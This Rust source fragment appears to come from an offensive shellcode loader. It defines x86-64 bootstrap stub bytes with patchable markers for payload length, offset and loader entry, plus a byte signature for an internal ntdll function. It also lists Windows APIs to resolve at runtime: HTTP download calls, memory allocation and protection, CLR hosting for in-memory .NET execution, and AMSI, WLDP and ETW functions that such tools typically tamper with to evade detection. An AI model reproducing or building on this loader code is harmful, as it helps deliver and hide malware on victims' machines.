/// Stub bootstrap byte array
#[cfg(feature = "std")]
pub static STUB_BYTES: [u8; 64] = [
    0xe8, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x83, 0xee, 0x05, 0x48, 0x89,
    0xe0, 0x56, 0x50, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0x48,
    0xb9, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0x48, 0x01, 0xf1,
    0x48, 0xba, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0x48, 0xb8,
    0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x01, 0xf0, 0xff,
    0xd0, 0x5c, 0x5e, 0xc3,
];
/// Byte marker for the payload length
#[cfg(feature = "std")]
pub static PAYLOAD_LEN_MARKER: [u8; 8] = [0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA];

/// Byte marker for the payload offset
#[cfg(feature = "std")]
pub static PAYLOAD_OFFSET_MARKER: [u8; 8] = [0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB];

/// Looader entry offset marker
#[cfg(feature = "std")]
pub static LOADER_ENTRY_OFFSET_MARKER: [u8; 8] = [0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC];


/// Signature bytes for LdrpReleaseTlsEntry function in ntdll.dll.
#[cfg(all(feature = "loader", windows))]
pub static LDRP_RELEASE_TLS_ENTRY_SIGNATURE_BYTES: &[u8] =
    b"\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B";

/// Commonly used Windows API modules and functions.
/// Stored as a list of strings with fixed offsets for runtime resolution.
/// **DLL names are case-sensitive!**
#[cfg(feature = "std")]
pub const WINDOWS_UTILITIES: &[&str] = &[
    "KERNEL32",                   //offset:0
    "GetLastError",               //offset:1
    "LoadLibraryA",               //offset:2
    "GetProcAddress",             //offset:3
    "WININET",                    //offset:4
    "NTDLL",                      //offset:5
    "HttpSendRequestA",           //offset:6
    "HttpOpenRequestA",           //offset:7
    "HttpQueryInfoA",             //offset:8
    "InternetReadFile",           //offset:9
    "InternetConnectA",           //offset:10
    "InternetOpenA",              //offset:11
    "InternetCloseHandle",        //offset:12
    "InternetCrackUrlA",          //offset:13
    "InternetSetOptionA",         //offset:14
    "InternetQueryDataAvailable", //offset:15
    "VirtualAlloc",               //offset:16
    "VirtualProtect",             //offset:17
    "VirtualFree",                //offset:18
    "GetProcessHeap",             //offset:19
    "HeapAlloc",                  //offset:20
    "HeapReAlloc",                //offset:21
    "HeapFree",                   //offset:22
    "FlushInstructionCache",      //offset:23
    "RtlDecompressBuffer",        //offset:24
    "MSCOREE",                    //offset:25
    "SafeArrayCreate",            //offset:26
    "SafeArrayCreateVector",      //offset:27
    "SafeArrayPutElement",        //offset:28
    "SafeArrayDestroy",           //offset:29
    "SafeArrayGetLBound",         //offset:30
    "SafeArrayGetUBound",         //offset:31
    "SysAllocString",             //offset:32
    "SysFreeString",              //offset:33
    "CorBindToRuntime",           //offset:34
    "CLRCreateInstance",          //offset:35
    "CoInitializeEx",             //offset:36
    "CoCreateInstance",           //offset:37
    "CoUninitialize",             //offset:38
    "GetCommandLineA",            //offset:39
    "GetCommandLineW",            //offset:40
    "CommandLineToArgvW",         //offset:41
    "GetThreadContext",           //offset:42
    "GetCurrentThread",           //offset:43
    "GetCurrentProcess",          //offset:44
    "WaitForSingleObject",        //offset:45
    "CreateThread",               //offset:46
    "CreateFileA",                //offset:47
    "GetFileSizeEx",              //offset:48
    "CloseHandle",                //offset:49
    "ExitProcess",                //offset:50
    "ExitThread",                 //offset:51
    "ADVAPI32",                   //offset:52
    "CRYPT32",                    //offset:53
    "OLE32",                      //offset:54
    "OLEAUT32",                   //offset:55
    "COMBASE",                    //offset:56
    "USER32",                     //offset:57
    "SHLWAPI",                    //offset:58
    "SHELL32",                    //offset:59
    "GetModuleHandleA",           //offset:60
    "VirtualQuery",               //offset:61
    "Sleep",                      //offset:62
    "MultiByteToWideChar",        //offset:63
    "GetUserDefaultLCID",         //offset:64
    "LoadTypeLib",                //offset:65
    "RtlEqualUnicodeString",      //offset:66
    "RtlEqualString",             //offset:67
    "SafeArrayUnaccessData",      //offset:68
    "SafeArrayAccessData",        //offset:69
    "CLRCreateInstance",          //offset:70
    "SafeArrayGetElement",        //offset:71
    "TlsAlloc",                   //offset:72
    "TlsSetValue",                //offset:73
    "TlsGetValue",                //offset:74
    "GetModuleHandleA",           //offset:75
    "AmsiScanBuffer",             //offset:76
    "AmsiScanString",             //offset:77
    "WldpQueryDynamicCodeTrust",  //offset:78
    "WldpIsClassInApprovedList",  //offset:79
    "EventWrite",                 //offset:80,
    "AMSI",                       //offset:81,
    "WLDP",                       //offset:82
];